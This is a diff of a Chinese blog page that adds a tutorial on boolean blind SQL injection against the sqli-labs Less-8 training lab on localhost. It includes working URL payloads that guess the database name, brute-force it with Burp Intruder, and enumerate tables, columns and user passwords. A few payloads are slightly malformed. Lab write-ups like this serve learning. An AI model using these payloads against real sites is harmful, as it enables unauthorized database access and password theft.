@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>Blind | blackceng的小窝</title>
+    <title>bool盲注（less8） | blackceng的小窝</title>
     <meta name="author" content="blackceng" />
     <meta name="description" content="我们要做的，就是追上那该死的火车，CJ！" />
     <meta name="keywords" content="" />
@@ -156,7 +156,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>Blind</h1>
+        <h1>bool盲注（less8）</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -184,7 +184,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/sql-lab/" style="color: #ffa2c4">
+                <a href="/tags/sql-lab/" style="color: #ff7d73">
                     sql_lab
                 </a>
             </span>
@@ -194,7 +194,63 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1>
+        <h1 id="Bool盲注常用的函数："><a href="#Bool盲注常用的函数：" class="headerlink" title="Bool盲注常用的函数："></a>Bool盲注常用的函数：</h1><pre><code class="language-php">database()	  显示数据库名称
+left(a,b)	  从左侧截取a的前b位
+substr(a,b,c) 从b位置开始，截取字符串a的c长度
+mid(a,b,c)    从位置b开始，截取a字符串的c位
+length()      返回字符串的长度
+Ascii()       将某个字符转换为ascii值
+char()        将ASCII码转换为对应的字符
+</code></pre>
+<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>由于less8页面只会返回you are in…且不会返回任何报错信息，这种情况就需要用到盲注。即把数据库名一点一点拼凑出来。利用</p>
+<pre><code>and length(database())=x--+
+</code></pre>
+<p>我们可以修改x的值观察何时会正常回显从而判断数据库名的长度。</p>
+<pre><code>left(database(),y)=&#39;x&#39;--+
+</code></pre>
+<p>通过修改x和y的值观察何时正常回显，从而让我们可以一个字一个字地拼凑出数据库名称以及之后的数据表数据列等等。</p>
+<h1 id="开始手工注入："><a href="#开始手工注入：" class="headerlink" title="开始手工注入："></a>开始手工注入：</h1><h2 id="首先确定是数字型还是字符型"><a href="#首先确定是数字型还是字符型" class="headerlink" title="首先确定是数字型还是字符型"></a>首先确定是数字型还是字符型</h2><pre><code>http://127.0.0.1/sqli-labs-master/Less-8/?id=1 and 1=2
+</code></pre>
+<p>不报错说明不是数字型</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39;
+</code></pre>
+<p>报错说明是字符型且闭合符号为’</p>
+<h2 id="确定数据库名长度"><a href="#确定数据库名长度" class="headerlink" title="确定数据库名长度"></a>确定数据库名长度</h2><pre><code>?id=1&#39;and length(database())=8--+
+</code></pre>
+<p><img src="/images/QQ_1766906142735.png"></p>
+<p>正常回显可知长度为8</p>
+<h2 id="使用bp爆破数据库"><a href="#使用bp爆破数据库" class="headerlink" title="使用bp爆破数据库"></a>使用bp爆破数据库</h2><p>打开bp并且开启拦截</p>
+<p><img src="/images/QQ_1766908050028.png"></p>
+<p>在自带的浏览器中输入</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and left(database(),1)&gt;&#39;a&#39;--+
+</code></pre>
+<p>回车后bp拦截到数据包</p>
+<p><img src="/images/QQ_1766908275439.png"></p>
+<p>把这个数据包发送到intruder</p>
+<p><img src="/images/QQ_1766908329226.png"></p>
+<p>在a位置处选中并点击添加payload位置</p>
+<p><img src="/images/QQ_1766908410981.png"></p>
+<p>在右侧箭头所指地方选择从a-z然后点击开始攻击</p>
+<p><img src="/images/QQ_1766908808356.png"></p>
+<p>如图所示，当x&#x3D;s时无回显，可知第一位是s，以此类推，我们可以得到数据库名security</p>
+<h2 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h2><h3 id="判断表个数"><a href="#判断表个数" class="headerlink" title="判断表个数"></a>判断表个数</h3><pre><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database()) =4 --+
+</code></pre>
+<p>回显正常，说明有四个表</p>
+<h3 id="获取表名称长度"><a href="#获取表名称长度" class="headerlink" title="获取表名称长度"></a>获取表名称长度</h3><pre><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit x,1)) =y --+
+</code></pre>
+<p>通过变化x和y可得知有几个表，每个表有多长</p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),)=&quot;y&quot;--+
+</code></pre>
+<p>通过变换 x 和 y 的值我们可以得到所有的表名。</p>
+<p>注：security里有四张表，limit 3,1 即第四张表 users</p>
+<p>按照之前的爆破法拼凑出来即可</p>
+<h2 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h2><pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),1)=&quot;y&quot;--+
+</code></pre>
+<p>通过变换 x 和 y 的值可以得到 username 和 password 这两个字段名</p>
+<h2 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h2><pre><code>?id=1&#39; and left((select password from users limit x,1),)=&quot;y&quot;--+
+</code></pre>
+<p>通过变换 x，y 的值可以得到所有的密码 。</p>
+
     </div>
     
     
